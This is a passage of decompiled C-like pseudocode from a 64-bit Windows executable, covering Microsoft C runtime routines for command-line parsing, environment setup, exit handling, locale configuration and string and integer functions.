  if ( a1 >= 0x1FFFFFFFFFFFFFFFLL || a2 >= 0xFFFFFFFFFFFFFFFFuLL / a3 || -1LL - 8 * a1 <= a3 * a2 )
    return nullptr;
  v4 = calloc_base(a3 * a2 + 8 * a1, 1u);
  free_base(nullptr);
  return v4;
}


// ===== _configure_wide_argv @ 0x1400059e4 size=0x171 =====
errno_t __cdecl configure_wide_argv(_crt_argv_mode mode)
{
  errno_t v2; // edi
  unsigned __int16 *v3; // rsi
  unsigned __int64 v4; // r15
  _QWORD *buffer_for_argv; // rax
  void *v6; // rbx
  void *v7; // rcx
  errno_t v8; // esi
  void *v9; // rdx
  int v10; // ecx
  _QWORD *i; // rax
  void *Block; // [rsp+68h] [rbp+38h] BYREF
  unsigned __int64 v14; // [rsp+70h] [rbp+40h] BYREF
  unsigned __int64 v15; // [rsp+78h] [rbp+48h] BYREF

  if ( (unsigned int)(mode - 1) <= 1 )
  {
    GetModuleFileNameW(nullptr, &Filename, 0x104u);
    v3 = (unsigned __int16 *)qword_14001D948;
    v2 = 0;
    qword_14001D950 = (__int64)&Filename;
    if ( qword_14001D948 == 0 || *(_WORD *)qword_14001D948 == 0 )
      v3 = &Filename;
    v14 = 0;
    v15 = 0;
    parse_command_line<wchar_t>(v3, nullptr, nullptr, &v14, &v15);
    v4 = v14;
    buffer_for_argv = _acrt_allocate_buffer_for_argv(v14, v15, 2u);
    v6 = buffer_for_argv;
    if ( buffer_for_argv != nullptr )
    {
      parse_command_line<wchar_t>(v3, buffer_for_argv, &buffer_for_argv[v4], &v14, &v15);
      if ( mode != _crt_argv_unexpanded_arguments )
      {
        Block = nullptr;
        v8 = common_expand_argv_wildcards<wchar_t>(v6, &Block);
        if ( v8 != 0 )
        {
          free_base(Block);
          Block = nullptr;
          free_base(v6);
          return v8;
        }
        v9 = Block;
        v10 = 0;
        for ( i = Block; *i != 0; ++v10 )
          ++i;
        dword_14001D92C = v10;
        Block = nullptr;
        qword_14001D938 = v9;
        free_base(nullptr);
        v7 = v6;
        Block = nullptr;
LABEL_16:
        free_base(v7);
        return v2;
      }
      qword_14001D938 = v6;
      dword_14001D92C = v14 - 1;
    }
    else
    {
      v2 = 12;
      *errno() = 12;
    }
    v7 = nullptr;
    goto LABEL_16;
  }
  v2 = 22;
  *errno() = 22;
  invalid_parameter_noinfo();
  return v2;
}


// ===== ??$common_initialize_environment_nolock@_W@@YAHXZ @ 0x140005b58 size=0x67 =====
__int64 common_initialize_environment_nolock<wchar_t>()
{
  unsigned int v0; // edi
  wchar_t *wide_environment_from_os; // rax
  wchar_t *v3; // rbx
  void *v4; // rax

  v0 = 0;
  if ( qword_14001D2B8 != 0 )
    return 0;
  wide_environment_from_os = (wchar_t *)_dcrt_get_wide_environment_from_os();
  v3 = wide_environment_from_os;
  if ( wide_environment_from_os != nullptr )
  {
    v4 = (void *)create_environment<wchar_t>(wide_environment_from_os);
    if ( v4 != nullptr )
    {
      qword_14001D2C0 = v4;
      qword_14001D2B8 = (__int64)v4;
    }
    else
    {
      v0 = -1;
    }
    free_base(nullptr);
  }
  else
  {
    v0 = -1;
  }
  free_base(v3);
  return v0;
}


// ===== ??$create_environment@_W@@YAQEAPEA_WQEA_W@Z @ 0x140005bc0 size=0x103 =====
void *__fastcall create_environment<wchar_t>(wchar_t *Source)
{
  void *v1; // rsi
  const wchar_t *v2; // r14
  __int64 v3; // rdx
  __int64 v4; // rax
  void *v5; // rax
  void *v6; // rbx
  wchar_t **v7; // r15
  __int64 v8; // rbp
  size_t v9; // rbp
  wchar_t *v10; // rax
  wchar_t *v11; // rdi

  v1 = nullptr;
  v2 = Source;
  v3 = 0;
  while ( *Source != 0 )
  {
    if ( *Source != 61 )
      ++v3;
    v4 = -1;
    do
      ++v4;
    while ( Source[v4] != 0 );
    Source += v4 + 1;
  }
  v5 = calloc_base(v3 + 1, 8u);
  v6 = v5;
  if ( v5 != nullptr )
  {
    v7 = (wchar_t **)v5;
    while ( *v2 != 0 )
    {
      v8 = -1;
      do
        ++v8;
      while ( v2[v8] != 0 );
      v9 = v8 + 1;
      if ( *v2 != 61 )
      {
        v10 = (wchar_t *)calloc_base(v9, 2u);
        v11 = v10;
        if ( v10 == nullptr )
        {
          unknown_libname_14(v6);
          free_base(nullptr);
          goto LABEL_20;
        }
        if ( wcscpy_s(v10, v9, v2) != 0 )
          invoke_watson(nullptr, nullptr, nullptr, 0, 0);
        *v7++ = v11;
        free_base(nullptr);
      }
      v2 += v9;
    }
    v1 = v6;
  }
LABEL_20:
  free_base(nullptr);
  return v1;
}


// ===== unknown_libname_14 @ 0x140005cc4 size=0x41 =====
// Microsoft VisualC 64bit universal runtime
void __fastcall unknown_libname_14(void **Block)
{
  void *v1; // rax
  void **v3; // rdi

  if ( Block != nullptr )
  {
    v1 = *Block;
    v3 = Block;
    while ( v1 != nullptr )
    {
      free_base(v1);
      v1 = *++v3;
    }
    free_base(Block);
  }
}


// ===== sub_140005D08 @ 0x140005d08 size=0x1a =====
void __fastcall sub_140005D08(void ***a1)
{
  void **v1; // rcx

  v1 = *a1;
  if ( v1 != qword_14001D2C8 )
    unknown_libname_14(v1);
}


// ===== sub_140005D24 @ 0x140005d24 size=0x1a =====
void __fastcall sub_140005D24(void ***a1)
{
  void **v1; // rcx

  v1 = *a1;
  if ( v1 != qword_14001D2C0 )
    unknown_libname_14(v1);
}


// ===== __dcrt_uninitialize_environments_nolock @ 0x140005d40 size=0x38 =====
void _dcrt_uninitialize_environments_nolock()
{
  sub_140005D08(&qword_14001D2B0);
  sub_140005D24((void ***)&qword_14001D2B8);
  unknown_libname_14((void **)qword_14001D2C8);
  unknown_libname_14((void **)qword_14001D2C0);
}


// ===== j_??$common_initialize_environment_nolock@_W@@YAHXZ @ 0x140005d78 size=0x5 =====
// attributes: thunk
__int64 common_initialize_environment_nolock<wchar_t>(void)
{
  return ??$common_initialize_environment_nolock@_W@@YAHXZ();
}


// ===== _get_wide_winmain_command_line @ 0x140005d80 size=0x4f =====
wchar_t *__cdecl get_wide_winmain_command_line()
{
  wchar_t *v0; // rcx
  bool v1; // al

  v0 = (wchar_t *)&unk_14001D2D0;
  if ( qword_14001D948 != 0 )
    v0 = (wchar_t *)qword_14001D948;
  v1 = false;
  while ( 1 )
  {
    if ( *v0 <= 0x20u )
    {
      if ( *v0 == 0 )
        return v0;
      if ( !v1 )
        break;
    }
    if ( *v0 == 34 )
      v1 = !v1;
    ++v0;
  }
  while ( *v0 != 0 && *v0 <= 0x20u )
    ++v0;
  return v0;
}


// ===== _initterm @ 0x140005dd0 size=0x76 =====
void __cdecl initterm(_PVFV *First, _PVFV *Last)
{
  _PVFV *v2; // rbx
  __int64 v3; // rbp
  unsigned __int64 v4; // rdi

  v2 = First;
  v3 = 0;
  v4 = (unsigned __int64)((char *)Last - (char *)First + 7) >> 3;
  if ( First > Last )
    v4 = 0;
  if ( v4 != 0 )
  {
    do
    {
      if ( *v2 != nullptr )
        ((void (__fastcall *)(_PVFV))*v2)(*v2);
      ++v2;
      ++v3;
    }
    while ( v3 != v4 );
  }
}


// ===== _initterm_e @ 0x140005e48 size=0x4c =====
int __cdecl initterm_e(_PIFV *First, _PIFV *Last)
{
  _PIFV *v3; // rbx
  bool i; // zf
  int result; // eax

  v3 = First;
  for ( i = First == Last; !i; i = v3 == Last )
  {
    if ( *v3 != nullptr )
    {
      result = ((__int64 (__fastcall *)(_PIFV))*v3)(*v3);
      if ( result != 0 )
        return result;
    }
    ++v3;
  }
  return 0;
}


// ===== dyntls_init_exception_filter @ 0x140005e94 size=0xc =====
_BOOL8 __fastcall dyntls_init_exception_filter(int a1)
{
  return a1 == -529697949;
}


// ===== ?common_exit@@YAXHW4_crt_exit_cleanup_mode@@W4_crt_exit_return_mode@@@Z @ 0x140005ea0 size=0x16c =====
void __fastcall common_exit(unsigned int a1, enum _crt_exit_cleanup_mode a2, enum _crt_exit_return_mode a3)
{
  HMODULE ModuleHandleW; // rax
  char *v7; // rcx
  _onexit_table_t *v8; // rcx
  char v9; // al

  if ( a3 == _crt_exit_terminate_process )
  {
    ModuleHandleW = GetModuleHandleW(nullptr);
    if ( ModuleHandleW != nullptr && *(_WORD *)ModuleHandleW == 23117 )
    {
      v7 = (char *)ModuleHandleW + *((int *)ModuleHandleW + 15);
      if ( *(_DWORD *)v7 == 17744
        && *((_WORD *)v7 + 12) == 523
        && *((_DWORD *)v7 + 33) > 0xEu
        && *((_DWORD *)v7 + 62) != a3 )
      {
        try_cor_exit_process(a1);
      }
    }
  }
  sub_14000AB5C(2);
  if ( byte_14001D2E0 == 0 )
  {
    _InterlockedExchange(&dword_14001D2D4, 1);
    if ( a2 != _crt_exit_full_cleanup )
    {
      if ( a2 != _crt_exit_quick_cleanup )
      {
LABEL_17:
        if ( a2 == _crt_exit_full_cleanup )
          initterm((_PVFV *)&qword_1400113B0, (_PVFV *)&qword_1400113D0);
        initterm((_PVFV *)&qword_1400113D8, (_PVFV *)&qword_1400113E0);
        v9 = byte_14001D2E0;
        if ( a3 == _crt_exit_terminate_process )
          v9 = 1;
        byte_14001D2E0 = v9;
        goto LABEL_22;
      }
      v8 = &Table;
    }
    else
    {
      if ( qword_14001D2D8 != (_security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu))) )
        ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))__ROR8__(
                                                        qword_14001D2D8 ^ _security_cookie,
                                                        _security_cookie & 0x3F))(
          0,
          0,
          0);
      v8 = &stru_14001D2F0;
    }
    execute_onexit_table(v8);
    goto LABEL_17;
  }
LABEL_22:
  sub_14000ABB0(2);
  if ( a3 == _crt_exit_terminate_process )
    exit_or_terminate_process(a1);
}


// ===== ?exit_or_terminate_process@@YAXI@Z @ 0x14000600c size=0x49 =====
void __fastcall __noreturn exit_or_terminate_process(UINT a1)
{
  HANDLE CurrentProcess; // rax

  if ( (unsigned __int8)_acrt_is_packaged_app() != 0 && (NtCurrentPeb()->NtGlobalFlag & 0x100) == 0 )
  {
    CurrentProcess = GetCurrentProcess();
    TerminateProcess(CurrentProcess, a1);
  }
  try_cor_exit_process(a1);
  ExitProcess(a1);
}


// ===== ?try_cor_exit_process@@YAXI@Z @ 0x140006058 size=0x6c =====
void __fastcall try_cor_exit_process(unsigned int a1)
{
  FARPROC CorExitProcess; // rax
  HMODULE phModule; // [rsp+38h] [rbp+10h] BYREF

  phModule = nullptr;
  if ( GetModuleHandleExW(0, L"mscoree.dll", &phModule) )
  {
    CorExitProcess = GetProcAddress(phModule, "CorExitProcess");
    if ( CorExitProcess != nullptr )
      ((void (__fastcall *)(_QWORD))CorExitProcess)(a1);
  }
  if ( phModule != nullptr )
    FreeLibrary(phModule);
}


// ===== sub_1400060C4 @ 0x1400060c4 size=0x8 =====
void __fastcall sub_1400060C4(__int64 a1)
{
  qword_14001D2D8 = a1;
}


// ===== _c_exit @ 0x1400060cc size=0x10 =====
void __cdecl c_exit()
{
  common_exit(0, _crt_exit_no_cleanup, _crt_exit_return_to_caller);
}


// ===== _cexit @ 0x1400060dc size=0xd =====
void __cdecl cexit()
{
  common_exit(0, _crt_exit_full_cleanup, _crt_exit_return_to_caller);
}


// ===== _exit @ 0x1400060ec size=0xc =====
void __cdecl __noreturn exit(int Code)
{
  common_exit(Code, _crt_exit_no_cleanup, _crt_exit_terminate_process);
}


// ===== _register_thread_local_exe_atexit_callback @ 0x1400060f8 size=0x43 =====
void __cdecl register_thread_local_exe_atexit_callback(_tls_callback_type Callback)
{
  if ( qword_14001D2D8 != (_security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu))) )
    terminate(64 - (unsigned int)(_security_cookie & 0x3F), Callback);
  qword_14001D2D8 = _security_cookie ^ __ROR8__(Callback, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
}


// ===== exit @ 0x14000613c size=0xa =====
void __cdecl __noreturn exit(int Code)
{
  common_exit(Code, _crt_exit_full_cleanup, _crt_exit_terminate_process);
}


// ===== _set_fmode @ 0x140006148 size=0x3d =====
errno_t __cdecl set_fmode(int Mode)
{
  if ( ((Mode - 0x4000) & 0xFFFF3FFF) != 0 || Mode == 49152 )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  else
  {
    _InterlockedExchange(&dword_14001DB6C, Mode);
    return 0;
  }
}


// ===== __acrt_set_locale_changed @ 0x140006188 size=0xc =====
__int64 _acrt_set_locale_changed()
{
  return (unsigned int)_InterlockedExchange(&dword_14001D2E4, 1);
}


// ===== __acrt_uninitialize_locale @ 0x140006194 size=0x47 =====
void _acrt_uninitialize_locale()
{
  if ( (wchar_t **)qword_14001D340 != &off_14001C160 )
  {
    sub_14000AB5C(4);
    qword_14001D340 = updatetlocinfoEx_nolock(&qword_14001D340, &off_14001C160);
    sub_14000ABB0(4);
  }
}


// ===== _configthreadlocale @ 0x1400061dc size=0x69 =====
int __cdecl configthreadlocale(int Flag)
{
  __int64 v2; // rax
  int v3; // r8d
  int v4; // ecx
  unsigned int v6; // r8d

  v2 = _acrt_getptd();
  v3 = *(_DWORD *)(v2 + 936);
  v4 = -((v3 & 2) != 0);
  if ( Flag == -1 )
  {
    dword_14001C8C0 = -1;
  }
  else if ( Flag != 0 )
  {
    if ( Flag == 1 )
    {
      v6 = v3 | 2;
    }
    else
    {
      if ( Flag != 2 )
      {
        *errno() = 22;
        invalid_parameter_noinfo();
        return -1;
      }
      v6 = v3 & 0xFFFFFFFD;
    }
    *(_DWORD *)(v2 + 936) = v6;
  }
  return v4 + 2;
}


// ===== sub_140006248 @ 0x140006248 size=0x7 =====
__int64 sub_140006248()
{
  return (unsigned int)dword_14001D2E8;
}


// ===== _set_new_mode @ 0x140006250 size=0x2b =====
int __cdecl set_new_mode(int NewMode)
{
  if ( (unsigned int)NewMode <= 1 )
    return _InterlockedExchange(&dword_14001D2E8, NewMode);
  *errno() = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ===== sub_14000627C @ 0x14000627c size=0x8 =====
void *sub_14000627C()
{
  return &unk_14001D2EC;
}


// ===== j__free_base @ 0x140006284 size=0x5 =====
// attributes: thunk
void __cdecl j__free_base(void *Block)
{
  free_base(Block);
}


// ===== ??$?RV_lambda_b8c45f8f788dd370798f47cfe8ac3a86_@@AEAV_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@V_lambda_332c3edc96d0294ec56c57d38c1cdfd5_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_b8c45f8f788dd370798f47cfe8ac3a86_@@AEAV_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@$$QEAV_lambda_332c3edc96d0294ec56c57d38c1cdfd5_@@@Z @ 0x14000628c size=0x3b =====
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_b8c45f8f788dd370798f47cfe8ac3a86_,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ &,_lambda_332c3edc96d0294ec56c57d38c1cdfd5_>(
        __int64 a1,
        unsigned int *a2,
        __int64 a3,
        unsigned int *a4)
{
  sub_14000AB5C(*a2);
  LODWORD(a3) = _lambda_4e60a939b0d047cfe11ddc22648dfba9_::operator()(a3);
  sub_14000ABB0(*a4);
  return (unsigned int)a3;
}


// ===== ??$?RV_lambda_e24bbb7b643b32fcea6fa61b31d4c984_@@AEAV_lambda_275893d493268fdec8709772e3fcec0e_@@V_lambda_9d71df4d7cf3f480f8d633942495c3b0_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_e24bbb7b643b32fcea6fa61b31d4c984_@@AEAV_lambda_275893d493268fdec8709772e3fcec0e_@@$$QEAV_lambda_9d71df4d7cf3f480f8d633942495c3b0_@@@Z @ 0x1400062c8 size=0x19f =====
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_e24bbb7b643b32fcea6fa61b31d4c984_,_lambda_275893d493268fdec8709772e3fcec0e_ &,_lambda_9d71df4d7cf3f480f8d633942495c3b0_>(
        __int64 a1,
        unsigned int *a2,
        _QWORD **a3,
        unsigned int *a4)
{
  unsigned int *v4; // rdi
  _QWORD *v6; // rdx
  unsigned int v7; // ebx
  uintptr_t v8; // rsi
  char v9; // r8
  uintptr_t *v10; // rdi
  uintptr_t *v11; // rbx
  uintptr_t *v12; // r12
  uintptr_t *v13; // r14
  uintptr_t v14; // rax
  uintptr_t v15; // rdx
  void (__fastcall *v16)(_QWORD); // rsi
  _QWORD *v17; // rdx
  uintptr_t *v18; // r9
  uintptr_t *v19; // rax

  v4 = a4;
  sub_14000AB5C(*a2);
  v6 = (_QWORD *)**a3;
  if ( v6 != nullptr )
  {
    v8 = _security_cookie;
    v9 = _security_cookie & 0x3F;
    v10 = (uintptr_t *)__ROR8__(*v6 ^ _security_cookie, _security_cookie & 0x3F);
    v11 = (uintptr_t *)__ROR8__(v6[1] ^ _security_cookie, _security_cookie & 0x3F);
    if ( (unsigned __int64)v10 - 1 <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v12 = v10;
      v13 = v11;
LABEL_5:
      v14 = v8 ^ __ROR8__(0, 64 - v9);
      while ( --v11 >= v10 )
      {
        if ( *v11 != v14 )
        {
          if ( v11 < v10 )
            break;
          v16 = (void (__fastcall *)(_QWORD))__ROR8__(*v11 ^ v8, v8 & 0x3F);
          *v11 = v14;
          v16(v16);
          v17 = (_QWORD *)**a3;
          v8 = _security_cookie;
          v9 = _security_cookie & 0x3F;
          v18 = (uintptr_t *)__ROR8__(*v17 ^ _security_cookie, _security_cookie & 0x3F);
          v19 = (uintptr_t *)__ROR8__(_security_cookie ^ v17[1], _security_cookie & 0x3F);
          if ( v18 != v12 || v19 != v13 )
          {
            v12 = v18;
            v10 = v18;
            v13 = v19;
            v11 = v19;
          }
          goto LABEL_5;
        }
      }
      if ( v10 != (uintptr_t *)-1LL )
      {
        free_base(v10);
        v8 = _security_cookie;
      }
      v15 = v8 ^ __ROR8__(0, 64 - ((unsigned __int8)v8 & 0x3Fu));
      *(_QWORD *)**a3 = v15;
      *(_QWORD *)(**a3 + 8LL) = v15;
      *(_QWORD *)(**a3 + 16LL) = v15;
    }
    v4 = a4;
    v7 = 0;
  }
  else
  {
    v7 = -1;
  }
  sub_14000ABB0(*v4);
  return v7;
}


// ===== ??R_lambda_4e60a939b0d047cfe11ddc22648dfba9_@@QEBAHXZ @ 0x140006468 size=0x1da =====
__int64 __fastcall _lambda_4e60a939b0d047cfe11ddc22648dfba9_::operator()(_QWORD **a1)
{
  __int64 v1; // rsi
  _QWORD *v3; // rbx
  uintptr_t v5; // r8
  _BYTE *v6; // rbp
  uintptr_t *v7; // r9
  char *v8; // rbx
  unsigned __int64 v9; // rbx
  __int64 v10; // rdi
  size_t v11; // rdi
  char *v12; // r14
  uintptr_t v13; // rdx
  unsigned __int64 v14; // rax
  uintptr_t *v15; // rcx

  v1 = 0;
  v3 = (_QWORD *)**a1;
  if ( v3 == nullptr )
    return 0xFFFFFFFFLL;
  v5 = _security_cookie;
  v6 = (_BYTE *)__ROR8__(_security_cookie ^ *v3, _security_cookie & 0x3F);
  v7 = (uintptr_t *)__ROR8__(_security_cookie ^ v3[1], _security_cookie & 0x3F);
  v8 = (char *)__ROR8__(_security_cookie ^ v3[2], _security_cookie & 0x3F);
  if ( v7 == (uintptr_t *)v8 )
  {
    v9 = (v8 - v6) >> 3;
    v10 = v9;
    if ( v9 > 0x200 )
      v10 = 512;
    v11 = v9 + v10;
    if ( v11 == 0 )
      v11 = 32;
    if ( v11 < v9 || (v12 = (char *)j__recalloc_base(v6, v11, 8u), free_base(nullptr), v12 == nullptr) )
    {
      v11 = v9 + 4;
      v12 = (char *)j__recalloc_base(v6, v9 + 4, 8u);
      free_base(nullptr);
      if ( v12 == nullptr )
        return 0xFFFFFFFFLL;
    }
    v5 = _security_cookie;
    v7 = (uintptr_t *)&v12[8 * v9];
    v8 = &v12[8 * v11];
    v13 = _security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
    v6 = v12;
    v14 = (unsigned __int64)(v8 - (char *)v7 + 7) >> 3;
    v15 = v7;
    if ( v7 > (uintptr_t *)v8 )
      v14 = 0;
    if ( v14 != 0 )
    {
      do
      {
        ++v1;
        *v15++ = v13;
      }
      while ( v1 != v14 );
      v5 = _security_cookie;
    }
  }
  *v7 = v5 ^ __ROR8__(*a1[1], 64 - ((unsigned __int8)v5 & 0x3Fu));
  *(_QWORD *)**a1 = _security_cookie ^ __ROR8__(v6, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  *(_QWORD *)(**a1 + 8LL) = _security_cookie ^ __ROR8__(v7 + 1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  *(_QWORD *)(**a1 + 16LL) = _security_cookie ^ __ROR8__(v8, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  return 0;
}


// ===== sub_140006644 @ 0x140006644 size=0xf =====
int __fastcall sub_140006644(_onexit_t Function)
{
  return register_onexit_function(&stru_14001D2F0, Function);
}


// ===== _execute_onexit_table @ 0x140006654 size=0x3a =====
int __cdecl execute_onexit_table(_onexit_table_t *Table)
{
  _onexit_table_t **v2; // [rsp+20h] [rbp-18h] BYREF
  _onexit_table_t *v3; // [rsp+40h] [rbp+8h] BYREF
  __int64 v4; // [rsp+48h] [rbp+10h] BYREF
  unsigned int v5; // [rsp+50h] [rbp+18h] BYREF
  unsigned int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = Table;
  v2 = &v3;
  v5 = 2;
  v6 = 2;
  return __crt_seh_guarded_call<int>::operator()<_lambda_e24bbb7b643b32fcea6fa61b31d4c984_,_lambda_275893d493268fdec8709772e3fcec0e_ &,_lambda_9d71df4d7cf3f480f8d633942495c3b0_>(
           (__int64)&v4,
           &v6,
           &v2,
           &v5);
}


// ===== _initialize_onexit_table @ 0x140006690 size=0x3f =====
int __cdecl initialize_onexit_table(_onexit_table_t *Table)
{
  _PVFV *v2; // r9

  if ( Table == nullptr )
    return -1;
  if ( Table->_first == Table->_end )
  {
    v2 = (_PVFV *)(_security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));
    Table->_first = v2;
    Table->_last = v2;
    Table->_end = v2;
  }
  return 0;
}


// ===== _register_onexit_function @ 0x1400066d0 size=0x48 =====
int __cdecl register_onexit_function(_onexit_table_t *Table, _onexit_t Function)
{
  unsigned int v3; // [rsp+20h] [rbp-20h] BYREF
  _QWORD v4[3]; // [rsp+28h] [rbp-18h] BYREF
  _onexit_table_t *v5; // [rsp+50h] [rbp+10h] BYREF
  _onexit_t v6; // [rsp+58h] [rbp+18h] BYREF
  char v7; // [rsp+60h] [rbp+20h] BYREF
  unsigned int v8; // [rsp+68h] [rbp+28h] BYREF

  v6 = Function;
  v5 = Table;
  v4[0] = &v5;
  v4[1] = &v6;
  v8 = 2;
  v3 = 2;
  return __crt_seh_guarded_call<int>::operator()<_lambda_b8c45f8f788dd370798f47cfe8ac3a86_,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ &,_lambda_332c3edc96d0294ec56c57d38c1cdfd5_>(
           (__int64)&v7,
           &v3,
           (__int64)v4,
           &v8);
}


// ===== initialize_global_variables @ 0x140006718 size=0x11 =====
char initialize_global_variables()
{
  qword_14001D340 = (__int64)&off_14001C160;
  return 1;
}


// ===== initialize_c @ 0x14000672c size=0x23 =====
char initialize_c()
{
  initialize_onexit_table(&stru_14001D2F0);
  initialize_onexit_table(&Table);
  return 1;
}


// ===== uninitialize_environment @ 0x140006750 size=0x10 =====
char uninitialize_environment()
{
  _dcrt_uninitialize_environments_nolock();
  return 1;
}


// ===== initialize_pointers @ 0x140006760 size=0x51 =====
char initialize_pointers()
{
  uintptr_t v0; // rbx

  v0 = _security_cookie ^ __ROR8__(0, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  sub_14000726C(v0);
  sub_14000B994(v0);
  _acrt_initialize_signal_handlers(v0);
  sub_140005770(v0);
  sub_1400060C4(v0);
  return 1;
}


// ===== sub_1400067B4 @ 0x1400067b4 size=0x7 =====
__vcrt_bool sub_1400067B4()
{
  return _vcrt_uninitialize(false);
}


// ===== uninitialize_allocated_memory @ 0x1400067bc size=0x8e =====
char uninitialize_allocated_memory()
{
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)off_14001C4F8, 0xFFFFFFFF) == 1
    && off_14001C4F8 != &unk_14001C2D0 )
  {
    free_base(off_14001C4F8);
    off_14001C4F8 = &unk_14001C2D0;
  }
  free_base(qword_14001D330);
  qword_14001D330 = nullptr;
  free_base(qword_14001D338);
  qword_14001D338 = nullptr;
  free_base(qword_14001D930);
  qword_14001D930 = nullptr;
  free_base(qword_14001D938);
  qword_14001D938 = nullptr;
  return 1;
}


// ===== __acrt_initialize @ 0x14000684c size=0x13 =====
__crt_bool __cdecl _acrt_initialize()
{
  return _acrt_execute_initializers(&off_1400120A0, &unk_140012190);
}


// ===== __acrt_uninitialize @ 0x140006860 size=0x13 =====
__crt_bool __cdecl _acrt_uninitialize(__crt_bool Terminating)
{
  return _acrt_execute_uninitializers(&off_1400120A0, &unk_140012190);
}


// ===== terminate @ 0x140006874 size=0x27 =====
void __noreturn terminate()
{
  __int64 v0; // rax
  void (__fastcall *v1)(_QWORD); // rbx

  v0 = _acrt_getptd();
  v1 = *(void (__fastcall **)(_QWORD))(v0 + 24);
  if ( v1 != nullptr )
    v1(*(_QWORD *)(v0 + 24));
  abort();
}


// ===== strcpy_s @ 0x14000689c size=0x5f =====
errno_t __cdecl strcpy_s(char *Destination, rsize_t SizeInBytes, const char *Source)
{
  errno_t v3; // ebx
  int *v4; // rax
  char *v6; // r9
  signed __int64 v7; // r8
  char v8; // al

  v3 = 0;
  if ( Destination == nullptr || SizeInBytes == 0 )
    goto LABEL_5;
  if ( Source == nullptr )
  {
    *Destination = 0;
LABEL_5:
    v4 = errno();
    v3 = 22;
LABEL_6:
    *v4 = v3;
    invalid_parameter_noinfo();
    return v3;
  }
  v6 = Destination;
  v7 = Source - Destination;
  do
  {
    v8 = v6[v7];
    *v6++ = v8;
    if ( v8 == 0 )
      break;
    --SizeInBytes;
  }
  while ( SizeInBytes != 0 );
  if ( SizeInBytes == 0 )
  {
    *Destination = 0;
    v4 = errno();
    v3 = 34;
    goto LABEL_6;
  }
  return v3;
}


// ===== abort @ 0x1400068fc size=0x55 =====
void __cdecl __noreturn abort()
{
  if ( _acrt_get_sigabrt_handler() != 0 )
    raise(22);
  if ( (byte_14001C148 & 2) != 0 )
  {
    if ( IsProcessorFeaturePresent(0x17u) )
      __fastfail(7u);
    _acrt_call_reportfault(3, 1073741845);
  }
  exit(3);
}


// ===== wcsncmp @ 0x140006954 size=0x2c =====
int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount)
{
  if ( MaxCount == 0 )
    return 0;
  while ( --MaxCount != 0 && *String1 != 0 && *String1 == *String2 )
  {
    ++String1;
    ++String2;
  }
  return *String1 - *String2;
}


// ===== ??$is_overflow_condition@K@__crt_strtox@@YA_NIK@Z @ 0x140006980 size=0x29 =====
bool __fastcall __crt_strtox::is_overflow_condition<unsigned long>(char a1, unsigned int a2)
{
  bool result; // al
  int v3; // ecx

  result = true;
  if ( (a1 & 4) == 0 )
  {
    if ( (a1 & 1) == 0 )
      return false;
    v3 = a1 & 2;
    if ( (v3 == 0 || a2 <= 0x80000000) && (v3 != 0 || a2 <= 0x7FFFFFFF) )
      return false;
  }
  return result;
}


// ===== ??$parse_integer@KV?$c_string_character_source@_W@__crt_strtox@@@__crt_strtox@@YAKQEAU__crt_locale_pointers@@V?$c_string_character_source@_W@0@H_N@Z @ 0x1400069ac size=0x6d4 =====
__int64 __fastcall __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<wchar_t>>(
        struct __crt_locale_pointers *a1,
        wint_t **a2,
        unsigned int a3,
        char a4)
{
  unsigned int v5; // r15d
  wint_t **v7; // rcx
  unsigned int v9; // r14d
  wint_t v10; // bx
  __int64 i; // rax
  int v12; // ebp
  int v13; // ecx
  int v14; // eax
  int v15; // eax
  wint_t v16; // dx
  wint_t *v17; // rcx
  wint_t *v18; // rcx
  unsigned int v19; // r8d
  unsigned int v20; // ecx
  int v21; // eax
  int v22; // ecx
  wint_t **v23; // rcx
  wint_t **v24; // rcx
  wint_t **v25; // rdx
  wint_t *v26; // [rsp+20h] [rbp-58h]
  _QWORD v27[3]; // [rsp+28h] [rbp-50h] BYREF
  char v28; // [rsp+40h] [rbp-38h]

  v5 = a3;
  if ( *a2 == nullptr || a3 != 0 && a3 - 2 > 0x22 )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    goto LABEL_3;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v27, a1);
  v9 = 0;
  v26 = *a2;
  v10 = **a2;
  for ( i = (__int64)(*a2 + 1); ; i = (__int64)(*a2 + 1) )
  {
    *a2 = (wint_t *)i;
    if ( iswctype(v10, 8u) == 0 )
      break;
    v10 = **a2;
  }
  v12 = a4 != 0;
  if ( v10 == 45 )
  {
    v12 |= 2u;
  }
  else if ( v10 != 43 )
  {
    goto LABEL_15;
  }
  v10 = *(*a2)++;
LABEL_15:
  v13 = 1632;
  if ( (v5 & 0xFFFFFFEF) == 0 )
  {
    if ( v10 < 0x30u )
      goto LABEL_62;
    if ( v10 < 0x3Au )
    {
      v14 = v10 - 48;
      goto LABEL_61;
    }
    if ( v10 >= 0xFF10u )
    {
      if ( v10 >= 0xFF1Au )
        v14 = -1;
      else
        v14 = v10 - 65296;
    }
    else
    {
      if ( v10 < 0x660u )
        goto LABEL_62;
      if ( v10 < 0x66Au )
      {
LABEL_22:
        v14 = v10 - v13;
